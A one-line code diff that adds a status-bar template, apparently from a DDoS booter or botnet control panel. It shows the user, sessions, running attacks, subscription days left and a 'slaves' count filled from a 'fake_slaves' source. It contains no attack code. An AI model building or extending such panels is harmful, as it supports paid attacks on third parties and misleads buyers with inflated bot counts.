@@ -1,0 +1,1 @@
+<<spinner("spinner")>> User: <<username()>> :: Sessions: <<online()>> :: Occurring Attacks: <<myrunning()>> :: Days left: <<daysleft()>> :: Slaves: <<slaves("fake_slaves")>> :: <<spinner("spinner")>>
